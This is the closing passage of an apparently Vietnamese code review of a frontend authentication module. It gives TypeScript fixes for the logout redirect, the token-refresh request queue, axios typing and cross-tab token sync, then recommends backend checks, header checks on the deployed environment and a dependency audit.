  window.location.replace(APP_ROUTES.HOME.to);          // hard redirect — huỷ toàn bộ JS context
};
```

Dùng ở cả ba nơi: interceptor 401, `RequirePermission`, menu Logout — để ba đường thoát có **cùng** hành vi.

### 6.5 `failedQueue` — kiểu đúng

```ts
type QueuedRequest = {
  resolve: (token: string) => void;
  reject: (reason: unknown) => void;
};

let failedQueue: QueuedRequest[] = [];

const processQueue = (error: unknown, token: string | null = null) => {
  failedQueue.forEach(({ resolve, reject }) =>
    error || !token ? reject(error) : resolve(token)
  );
  failedQueue = [];
};
```

### 6.6 Interceptor — khớp kiểu với axios

```ts
// src/types/axios.d.ts
import 'axios';

declare module 'axios' {
  export interface AxiosInstance {
    request<T = any>(config: AxiosRequestConfig): Promise<T>;
    get<T = any>(url: string, config?: AxiosRequestConfig): Promise<T>;
    post<T = any>(url: string, data?: any, config?: AxiosRequestConfig): Promise<T>;
    put<T = any>(url: string, data?: any, config?: AxiosRequestConfig): Promise<T>;
    patch<T = any>(url: string, data?: any, config?: AxiosRequestConfig): Promise<T>;
    delete<T = any>(url: string, config?: AxiosRequestConfig): Promise<T>;
  }
}
```

Sau khai báo này, TypeScript hiểu đúng rằng interceptor đã unwrap — kiểu trả về của controller được compiler kiểm chứng thay vì tin vào khai báo tay.

### 6.7 Đồng bộ refresh giữa các tab

```ts
const refreshChannel = new BroadcastChannel('auth-refresh');

refreshChannel.onmessage = (e) => {
  if (e.data?.type === 'TOKEN_REFRESHED' && e.data.token) {
    setToken(e.data.token);          // tab khác đã refresh — dùng token mới
    processQueue(null, e.data.token);
    isRefreshing = false;
  }
  if (e.data?.type === 'SESSION_DEAD') {
    window.location.replace(APP_ROUTES.HOME.to);
  }
};

// Sau khi refresh thành công:
refreshChannel.postMessage({ type: 'TOKEN_REFRESHED', token: newToken });
```

---

## Ghi chú cuối

Đánh giá này dựa hoàn toàn trên đọc code tĩnh. Ba việc cần làm để có kết luận đầy đủ:

1. **Xác minh phía backend** — thời hạn access/refresh token, có rotation không, có thu hồi token khi đổi mật khẩu không, và (quan trọng) production có trả `otp` trong response không. Nhiều kết luận ở §3.5 và §3.6 phụ thuộc câu trả lời.
2. **Kiểm tra header thực tế** trên môi trường đã deploy — có thể có reverse proxy/CDN phía trước nginx đã bổ sung header; nếu vậy §3.1 sẽ nhẹ đi đáng kể.
3. **Rà soát dependency** — `yarn audit` hoặc tương đương, vì rủi ro XSS lớn nhất thường đến từ thư viện bên thứ ba chứ không phải code tự viết.

Về phần đánh giá kỹ năng: cần nhấn mạnh rằng **phần khó nhất của file này được làm đúng**. Các thiếu sót nêu trên đều thuộc nhóm "chưa đầy đủ", không phải "sai cách tiếp cận" — và phần lớn sửa được trong một đợt refactor ngắn mà không cần thay đổi kiến trúc.
